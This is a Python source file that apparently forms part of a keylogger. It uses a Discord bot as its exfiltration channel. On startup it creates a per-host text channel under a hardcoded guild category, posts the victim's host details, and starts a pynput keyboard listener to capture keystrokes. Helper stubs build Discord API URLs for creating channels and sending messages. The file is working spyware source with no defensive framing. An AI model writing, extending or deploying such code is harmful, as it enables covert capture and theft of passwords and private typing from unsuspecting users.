import discord as discord_official
from pynput.keyboard import Listener

from classes import Host
from logger_util.logger import on_press
from utils import auth

header = {}
channel_id = None

intents = discord_official.Intents.default()
intents.members = True

client = discord_official.Client(command_prefix='-', intents=intents)

key_log = {}


def run_bot(channel_name: str, host: Host, msg):
    @client.event
    async def on_ready():
        print('We have logged in as {0.user}'.format(client))
        # print(client.guilds)
        # guild =
        # print(discord.utils.get(client.guilds[0].categories, id='1048572735082729482'))
        guild = discord_official.utils.get(client.guilds)
        category = discord_official.utils.get(guild.categories, id=1048572735082729482)
        channels = category.channels
        channel = discord_official.utils.get(channels, name=channel_name)
        new_channel = False
        if channel is None:
            channel = await category.create_text_channel(channel_name)
            new_channel = True
        if new_channel:
            await channel.send(host)
        await channel.send(msg)

        with Listener(on_press=on_press, on_release=None) as listener:
            listener.join()

    client.run(auth.get_discord_token())


def create_channel(channel_name):
    # Create channel for log session
    request_url = "https://discord.com/api/v9/guilds/1048572679583707136/channels"
    # "parent_id": "1048572735082729482",
    print("Created channel")
    global channel_id
    # channel_id = response["id"]


def send_message(message):
    # Send message to the channel
    request_url = "https://discord.com/api/v9/channels/" + str(channel_id) + "/messages"
